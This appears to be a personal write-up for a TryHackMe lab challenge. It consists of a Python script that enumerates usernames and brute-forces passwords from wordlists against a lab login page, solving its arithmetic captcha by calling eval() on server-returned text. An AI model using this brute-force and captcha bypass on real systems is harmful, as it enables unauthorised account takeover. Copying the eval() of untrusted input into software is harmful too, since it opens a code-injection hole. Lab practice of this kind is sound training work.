# Capture

These notes are from a challenge I did @[tryhackme](https://tryhackme.com) called [Internal Penetration Testing Challenge](https://tryhackme.com/room/capture).

## Script

``` py
import requests, re
url = f"http://10.10.1.89/login"

def calc(captcha): return eval("".join(captcha[:-2])) 

def hack(url,captcha):
    f = open("./user.txt","r")
    for i in f:
        data = f"username={i.strip()}&password=test&captcha={calc(captcha)}"
        getuser = requests.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"}).text.split("\n")
        if "does not exist" not in getuser[104]:
            f = open("./pw.txt", "r")
            for j in f:
                data = f"username={i.strip()}&password={j.strip()}&captcha={calc(captcha)}"
                getpw = requests.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
                if "Flag.txt" in getpw.text: 
                    return i.strip(), j.strip(), re.search('<h3>(.*?)</h3>', getpw.text).group(1)
                else: 
                    captcha = getpw.text.split("\n")[96].split()
        else: captcha = getuser[96].split()

user, pw, flag = hack(url,requests.post(url, data="username=test&password=test", headers={"Content-Type": "application/x-www-form-urlencoded"}).text.split("\n")[96].split())
print("User: " + user + "\nPW: " + pw + "\nFlag: " + flag)
```
